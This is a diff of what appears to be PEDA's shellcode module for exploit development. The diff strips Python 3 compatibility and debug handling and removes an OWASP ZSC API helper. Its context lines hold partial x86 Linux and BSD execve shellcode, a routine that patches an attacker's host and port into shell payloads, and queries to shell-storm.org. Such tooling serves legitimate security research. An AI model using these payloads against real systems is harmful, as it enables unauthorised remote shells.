@@ -6,36 +6,13 @@
 #       License: see LICENSE file for details
 #
 
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
-
 import random
 import socket
 import struct
-import traceback
-import six.moves.http_client
-from six.moves import range
-import sys
-
-import config
+import httplib
 from utils import msg, error_msg
 
-if sys.version_info.major is 3:
-    from urllib.request import urlopen
-    from urllib.parse import urlencode
-    pyversion = 3
-else:
-    from urllib import urlopen
-    from urllib import urlencode
-    pyversion = 2
-
-def _make_values_bytes(dict_):
-    """Make shellcode in dictionaries bytes"""
-    return {k: six.b(v) for k, v in dict_.items()}
-
-
-shellcode_x86_linux = _make_values_bytes({
+shellcode_x86_linux = {
     "exec": (
         "\x31\xc0"               # 0x00000000:     xor eax,eax
         "\x50"                   # 0x00000002:     push eax
@@ -139,9 +116,9 @@ shellcode_x86_linux = _make_values_bytes({
         "\xb0\x0b"               # 0x00000042:     mov al,0xb
         "\xcd\x80"               # 0x00000044:     int 0x80 ; execve()
     )
-})
+}
 
-shellcode_x86_bsd = _make_values_bytes({
+shellcode_x86_bsd = {
     "exec": (
         "\x31\xc0"               # 0x00000000:     xor eax,eax
         "\x50"                   # 0x00000002:     push eax
@@ -229,8 +206,7 @@ shellcode_x86_bsd = _make_values_bytes({
         "\xb0\x3b"               # 0x0000003C:     mov al,0x3b
         "\xcd\x80"               # 0x0000003E:     int 0x80 ; execve()
     )
-})
-
+}
 
 shellcode_x86 = {"linux": shellcode_x86_linux, "bsd": shellcode_x86_bsd}
 
@@ -294,14 +270,11 @@ class Shellcode():
         try:
             port = struct.pack(">H", port)
             addr = socket.inet_aton(host)
-            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68" + port)
-            shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02" + port)
-            shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68" + addr)
+            shellcode = shellcode.replace("\x66\x68\x41\x42", "\x66\x68" + port)
+            shellcode = shellcode.replace("\x68\xff\x02\x41\x42", "\x68\xff\x02" + port)
+            shellcode = shellcode.replace("\x68\x7f\x7f\x7f\x7f", "\x68" + addr)
             return shellcode
-        except Exception as e:
-            if config.Option.get("debug") == "on":
-                msg("Exception: %s" %e)
-                traceback.print_exc()
+        except:
             return None
 
     """ search() and display() use the shell-storm API """
@@ -310,16 +283,11 @@ class Shellcode():
             return None
         try:
             msg("Connecting to shell-storm.org...")
-            s = six.moves.http_client.HTTPConnection("shell-storm.org")
-
+            s = httplib.HTTPConnection("shell-storm.org")
             s.request("GET", "/api/?s="+str(keyword))
             res = s.getresponse()
-            read_result = res.read().decode('utf-8')
-            data_l = [x for x in read_result.split('\n') if x]  # remove empty results
-        except Exception as e:
-            if config.Option.get("debug") == "on":
-                msg("Exception: %s" %e)
-                traceback.print_exc()
+            data_l = res.read().split('\n')
+        except:
             error_msg("Cannot connect to shell-storm.org")
             return None
 
@@ -335,10 +303,8 @@ class Shellcode():
                          'ScUrl': desc[4]
                        }
                 data_dl.append(dico)
-            except Exception as e:
-                if config.Option.get("debug") == "on":
-                    msg("Exception: %s" %e)
-                    traceback.print_exc()
+            except:
+                pass
 
         return data_dl
 
@@ -348,7 +314,7 @@ class Shellcode():
 
         try:
             msg("Connecting to shell-storm.org...")
-            s = six.moves.http_client.HTTPConnection("shell-storm.org")
+            s = httplib.HTTPConnection("shell-storm.org")
         except:
             error_msg("Cannot connect to shell-storm.org")
             return None
@@ -366,19 +332,3 @@ class Shellcode():
         data = data.replace("&lt;", "<")
         data = data.replace("&gt;", ">")
         return data
-    #OWASP ZSC API Z3r0D4y.Com
-    def zsc(self,os,job,encode):
-        try:
-            msg('Connection to OWASP ZSC API api.z3r0d4y.com')
-            params = urlencode({
-                    'api_name': 'zsc', 
-                    'os': os,
-                    'job': job,
-                    'encode': encode})
-            shellcode = urlopen("http://api.z3r0d4y.com/index.py?%s\n"%(str(params))).read()
-            if pyversion is 3:
-                shellcode = str(shellcode,encoding='ascii')
-            return '\n"'+shellcode.replace('\n','')+'"\n'
-        except:
-            error_msg("Error while connecting to api.z3r0d4y.com ...")
-            return None
